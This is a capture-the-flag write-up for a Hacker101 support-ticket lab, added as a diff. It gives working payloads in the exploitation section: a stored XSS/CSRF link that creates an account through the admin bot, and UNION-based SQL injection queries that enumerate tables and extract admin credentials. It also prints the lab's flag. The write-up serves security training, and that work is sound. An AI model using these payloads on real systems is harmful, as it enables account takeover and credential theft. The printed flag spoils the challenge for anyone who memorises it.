@@ -1,0 +1,100 @@
+================================
+LAB: Ticketastic - Live Instance
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 15-16, 2026
+Lab URL: https://83d2d4eff90efc5de984db7174f6a2ef.ctf.hacker101.com/
+Category: Web Application Security
+Level: Moderate
+Objective: Identify and exploit vulnerabilities to capture 2 flags
+Description: Support ticket system with admin login and ticket submission functionality
+
+[RECONNAISSANCE]
+----------------
+
+Initial enumeration revealed three main endpoints:
+- GET / - Homepage with links to newTicket and login
+- GET /newTicket - Ticket submission form (POST method, parameters: title, body)
+- GET /login - Admin authentication form (POST method, parameters: username, password)
+
+Login enumeration disclosed valid username through error messages:
+- username=test, password=test → "Invalid username"
+- username=admin, password=test → "Invalid password"
+Confirmed existence of 'admin' account.
+
+Manual SQLi testing on login endpoint showed no exploitable injection (parameterized queries or input sanitization present).
+
+Directory fuzzing with ffuf revealed no additional endpoints beyond documented paths.
+
+GET /ticket?id=1 returned "Not logged in" - indicating ticket viewing requires authentication.
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+
+Vulnerability 1: Stored XSS with CSRF capabilities
+The newTicket endpoint accepted HTML/JavaScript without sanitization. Admin bot automatically reviews submitted tickets, enabling XSS execution in privileged context.
+
+Vulnerability 2: SQL Injection on authenticated endpoint
+GET /ticket?id=0 while authenticated triggered Python traceback:
+  File "./main.py", line 79, in ticket
+    title, body, reply = cur.fetchone()
+  TypeError: 'NoneType' object is not iterable
+
+Error disclosed:
+- Direct SQL cursor usage (no ORM)
+- Three-column query structure (title, body, reply)
+- Parameter id inserted without validation
+- Authentication check occurs before SQL execution (SQLi only exploitable post-auth)
+
+[EXPLOITATION]
+--------------
+
+FLAG 1 - Stored XSS + CSRF for account creation:
+
+Payload submitted via POST /newTicket:
+title=<a href="http://localhost//newUser?username=hacker&password=test&password2=test> csrf </a>
+body=test
+
+Admin bot triggered CSRF, creating user account.
+
+Authenticated with created credentials:
+POST /login
+username=hacker&password=test
+
+Accessed ticket containing Flag 1.
+
+FLAG 2 - UNION-based SQL injection:
+
+Confirmed UNION SQLi with null column test:
+GET /ticket?id=0 UNION SELECT NULL,NULL,NULL--
+Response displayed three null values in ticket structure.
+
+Enumerated database schema:
+GET /ticket?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
+Result: tickets, users
+
+Extracted admin credentials directly:
+GET /ticket?id=0 UNION SELECT username,password,'x' FROM users WHERE username='admin'--
+
+Response body contained Flag 2:
+^FLAG^20c7193c343767a2dfebf005acfb412fd40d668e69266d2f737b2b183e169d7b$FLAG$
+
+[EVIDENCE]
+----------
+
+Flag 1: Retrieved via CSRF-created user account access to admin tickets
+Flag 2: ^FLAG^20c7193c343767a2dfebf005acfb412fd40d668e69266d2f737b2b183e169d7b$FLAG$
+
+HTTP requests demonstrating successful exploitation documented in reconnaissance and exploitation sections.
+
+[LESSONS LEARNED]
+-----------------
+
+- User enumeration via differential error messages enables account discovery and targeted attacks
+- Stored XSS in ticket systems exploitable through CSRF when admin bots review submissions automatically
+- Python tracebacks in production leak critical implementation details (query structure, column count, framework)
+- Authentication checks must occur after input validation - pre-auth SQLi testing insufficient when vulnerability requires authenticated access
+- UNION-based SQLi exploitable when error messages reveal column structure or traceback discloses query format
+- Parameterized queries and output encoding are mandatory for user-controlled input in SQL queries and HTML rendering
